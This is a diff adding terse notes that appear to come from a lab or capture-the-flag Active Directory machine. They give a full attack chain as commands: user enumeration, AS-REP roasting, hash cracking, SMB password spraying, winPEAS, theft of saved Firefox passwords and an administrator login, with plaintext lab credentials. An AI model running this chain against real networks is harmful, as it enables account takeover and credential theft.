@@ -1,0 +1,38 @@
+~/go/bin/kerbrute userenum --dc Dictionary.csl -d Dictionary.csl /usr/share/wordlists/rockyou.txt  
+
+GetNPUsers.py -usersfile user -dc-ip 172.31.3.4 dictionary.csl/ -no-pass
+
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+#now we have user and passwd
+evil-winrm -u izabel -p 'June2013' -i dictionary.csl 
+
+
+evil-winrm, rdp, pyexec is not working
+
+#rpc is working
+rpcclient -U izabel 172.31.3.4 
+
+enumdomusers
+
+#need to create new wordlist for the password using python script
+
+crackmapexec smb 172.31.3.4 -u new_ad_users -p wordlist.txt --continue-on-success
+
+
+#upload winpeas.bat or exe
+and run the file
+C:\Users\BACKUP-Izabel\AppData\Roaming\Mozilla\Firefox\Profiles\65wr35iv.default-release> 
+download logins.json and key4.db
+
+evil-winrm -u administrator -p 'kC7pbrQAsTT' -i dictionary.csl 
+
+
+
+
+
+
+
+
+
+
